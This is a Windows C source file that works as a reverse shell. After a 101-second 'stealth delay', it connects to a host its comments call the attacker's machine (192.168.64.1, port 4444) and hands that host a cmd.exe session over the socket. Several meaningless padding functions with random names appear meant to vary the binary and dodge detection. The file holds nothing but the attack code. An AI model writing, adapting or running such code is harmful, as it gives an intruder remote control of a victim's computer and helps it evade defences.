
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")


void IuBaFifT() {
    int x = 429;
    int y = 637;
    if (x + y > 2000) { printf("%d", x); }
}


void AcEQdAin() {
    int x = 748;
    int y = 943;
    if (x + y > 2000) { printf("%d", x); }
}


void QHWzpAeo() {
    int x = 758;
    int y = 522;
    if (x + y > 2000) { printf("%d", x); }
}


void BTLZWCug() {
    int x = 104;
    int y = 842;
    if (x + y > 2000) { printf("%d", x); }
}


void VVxxTNbw() {
    int x = 433;
    int y = 586;
    if (x + y > 2000) { printf("%d", x); }
}


int main() {
    // 1. STEALTH DELAY (101 Seconds)
    Sleep(101000); 

    // 2. WINSOCK STARTUP
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);

    // 3. CREATE WINDOWS SOCKET
    SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(4444);
    
    // This is your Mac's IP address (the Attacker)
    serv_addr.sin_addr.s_addr = inet_addr("192.168.64.1");

    // 4. CONNECT BACK TO MAC
    if (WSAConnect(sock, (SOCKADDR*)&serv_addr, sizeof(serv_addr), NULL, NULL, NULL, NULL) == 0) {
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        
        // Redirect the Windows CMD to the Mac terminal
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

        char cmd[] = "cmd.exe"; 
        CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    }
    return 0;
}
